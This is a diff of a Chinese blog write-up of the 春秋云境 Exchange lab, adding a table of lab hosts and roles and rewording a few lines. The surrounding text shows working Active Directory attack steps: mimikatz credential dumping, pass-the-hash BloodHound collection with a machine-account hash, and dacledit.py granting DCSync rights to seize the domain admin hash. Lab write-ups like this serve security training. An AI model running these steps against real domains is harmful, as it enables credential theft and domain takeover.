@@ -347,7 +347,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.6k字</span>
+        <span class="post-count">1.7k字</span>
       </span>
     </span>
 
@@ -551,6 +551,67 @@ e10adc3949ba59abbe56e057f20f883e:123456<span aria-hidden="true" class="line-numb
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://172.22.3.9/owa/auth/logon.aspx?url<span class="token operator">=</span>https%3a%2f%2f172.22.3.9%2fowa%2f<span class="token operator">&amp;</span><span class="token assign-left variable">reason</span><span class="token operator">=</span><span class="token number">0</span> code:200 len:28237  title:Outlook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>分析一下端口：</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>172.22.3.2</th>
+<th>172.22.3.9</th>
+<th>172.22.3.12</th>
+<th>172.22.3.26</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>主机名</strong></td>
+<td>XIAORANG-WIN16</td>
+<td>XIAORANG-EXC01</td>
+<td>-</td>
+<td>XIAORANG-PC</td>
+</tr>
+<tr>
+<td><strong>操作系统</strong></td>
+<td>Windows Server 2016</td>
+<td>Windows Server 2016</td>
+<td>Linux (SSH 22)</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><strong>角色</strong></td>
+<td>域控制器</td>
+<td>Exchange 服务器</td>
+<td>Web 服务器</td>
+<td>终端</td>
+</tr>
+<tr>
+<td><strong>Web 服务</strong></td>
+<td>-</td>
+<td>Exchange OWA</td>
+<td>Lumia ERP</td>
+<td>-</td>
+</tr>
+<tr>
+<td><strong>文件共享</strong></td>
+<td>✅ (139,445)</td>
+<td>✅ (139,445)</td>
+<td>-</td>
+<td>✅ (139,445)</td>
+</tr>
+<tr>
+<td><strong>RPC 服务</strong></td>
+<td>✅ (135)</td>
+<td>✅ (135)</td>
+<td>-</td>
+<td>✅ (135)</td>
+</tr>
+<tr>
+<td><strong>Kerberos</strong></td>
+<td>✅ (88)</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+</tbody></table>
 <hr>
 <h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>公式 wget 传入搭 stowaway 代理</p>
 <hr>
@@ -568,8 +629,7 @@ net localgroup administrators wmc <span class="token operator">/</span>add<span 
 <p>flag 在 C:\Users\Administrator.XIAORANG\flag\flag02.txt</p>
 <p><img src="/blog/2026/03/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/IMG-20260312235247324.png"></p>
 <hr>
-<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>域控制器是 XIAORANG-WIN16</p>
-<p>任务管理器发现还有另一个用户在线</p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>任务管理器发现还有另一个用户在线</p>
 <p><img src="/blog/2026/03/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/IMG-20260313004928345.png"></p>
 <p>传猕猴桃上去抓密码</p>
 <pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span>\mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords"</span> <span class="token string">"exit"</span> > 1<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -619,12 +679,12 @@ net localgroup administrators wmc <span class="token operator">/</span>add<span 
 <td></td>
 </tr>
 </tbody></table>
-<p>然后这里应该使用机器账户来 pth bloodhound 分析环境</p>
+<p>然后这里应该使用机器账户来 pth bloodhound 分析环境获取的信息比较全：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> bloodhound-python <span class="token parameter variable">-u</span> <span class="token string">"XIAORANG-EXC01$"</span> <span class="token parameter variable">--hashes</span> :f37e71617489d914f5a186ae7c646d14 <span class="token parameter variable">-d</span> xiaorang.lab <span class="token parameter variable">-dc</span> XIAORANG-WIN16.xiaorang.lab <span class="token parameter variable">-c</span> all --dns-tcp <span class="token parameter variable">-ns</span> <span class="token number">172.22</span>.3.2 --auth-method ntlm <span class="token parameter variable">--zip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2026/03/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/IMG-20260313011633148.png"></p>
 <p><img src="/blog/2026/03/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Exchange/IMG-20260313013053837.png"></p>
-<p>分析发现这台机子对域内的用户具有 WriteDACL 权限，也就是说我们可以利用机器用户给域内的用户添加 DCSync 权限，从而拿到域管的hash</p>
+<p>分析发现这台机子对域内的用户具有 WriteDacl 权限，也就是说我们可以利用机器用户给域内的用户添加 DCSync 权限，从而拿到域管的 hash</p>
 <h1 id="XIAORANG-WIN16-172-22-3-2"><a href="#XIAORANG-WIN16-172-22-3-2" class="headerlink" title="XIAORANG-WIN16 - 172.22.3.2"></a>XIAORANG-WIN16 - 172.22.3.2</h1><p>使用 dacledit.py 给域内用户 Zhangtong 添加权限</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> dacledit.py xiaorang.lab/XIAORANG-EXC01<span class="token punctuation">\</span>$ <span class="token parameter variable">-hashes</span> :f37e71617489d914f5a186ae7c646d14 <span class="token parameter variable">-action</span> <span class="token function">write</span> <span class="token parameter variable">-rights</span> DCSync <span class="token parameter variable">-principal</span> Zhangtong -target-dn <span class="token string">"DC=xiaorang,DC=lab"</span> -dc-ip <span class="token number">172.22</span>.3.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
